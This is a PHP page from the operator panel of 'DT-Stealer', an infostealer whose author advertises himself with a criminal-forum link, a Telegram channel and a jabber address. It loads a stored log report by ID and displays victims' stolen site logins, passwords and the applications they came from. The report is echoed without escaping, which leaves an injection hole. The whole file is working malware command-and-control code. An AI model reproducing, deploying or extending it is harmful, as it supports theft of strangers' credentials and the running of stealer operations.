<?php
session_start();
if(!$_SESSION['admin'])
{
	header("Location: login.php");
	exit;
}
require_once "include/db.php";

if (isset($_GET["id"]))
{
	$stmt = $db->prepare("SELECT report FROM logs WHERE id=?");
	$stmt->execute(array($_GET["id"]));
	$report = $stmt->fetchColumn();

	if ($report == null)
	{
		echo "No report ID";
		exit;
	}

}
else
{
	header("Location: index.php");
	exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>DT-Stealer</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
	<link rel="stylesheet" href="css/main.css">
	<link rel="stylesheet" href="css/responsive.css">
</head>
<body>

	<header>
		<div class="container">
			<div class="header_content">
				<div class="logo_wrap">
					<a href="index.php" class="logo_link">DT-Stealer</a>
				</div>
				<div class="info_wrap">
					<small>by DeiTy | <a href="https://xss.is/" target="_blank">XSS.IS</a> | <a href="https://t.me/deity_dt_anime" target="_blank">My Telegram</a></small>
					<br>
					<small>My jabber: deity.developer@thesecure.biz</small>
				</div>
			</div>
		</div>
	</header>

	<section class="site_wrap">
		<div class="container bac-wrap">
			<div class="table-responsive">
				<table class="table">
					<thead>
						<tr>
							<th scope="col">Site</th>
							<th scope="col">Login</th>
							<th scope="col">Password</th>
							<th scope="col">Application</th>
						</tr>
					</thead>
					<tbody>
						<?php echo $report; ?>
					</tbody>
				</table>
			</div>
		</div>
	</section>
	<footer>
		<span>(c)DT Stealer by DeiTy v0.1</span>
	</footer>
	<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
</body>
</html>